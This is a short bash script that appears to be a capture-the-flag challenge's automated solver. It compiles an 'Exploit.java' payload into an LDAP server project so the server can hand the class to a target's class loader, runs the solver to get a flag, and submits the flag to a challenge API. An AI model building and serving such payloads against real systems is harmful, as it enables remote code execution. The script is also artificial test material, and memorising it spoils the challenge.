#!/bin/bash

set -e

echo "⬇️ Installing Java and Maven"
apt-get update >/dev/null
apt-get install -y openjdk-17-jdk-headless maven >/dev/null

echo "🛠️ Compiling exploit payload"
cd auto-solve
# compile the payload and allow the LDAP server's ClassLoader to access it
# (using older Java because older openjdk docker images are smaller)
javac Exploit.java -source 8 -target 8 -d ldap-server/src/main/resources/ >/dev/null

echo "🛠️ Building solver"
cd ldap-server
mvn clean package >/dev/null
FLAG=$(java -jar target/ldap-server-1.0-SNAPSHOT.jar)

echo "⬆️ POSTing flag"
RES=$(curl -s 'http://172.20.0.3/api/challenges/submit' \
   -X POST \
   -H 'Content-Type: application/json' \
   --data-binary "{\"challenge_id\": \"forgot-your-password\", \"task_id\": \"dashboard-content\", \"flag\" : \"$FLAG\"}")

if [[ $RES != *"Congratulations"* ]]; then
 echo "Failed to submit the flag - $RES"
 exit 5
fi

echo "OK - tests passed"
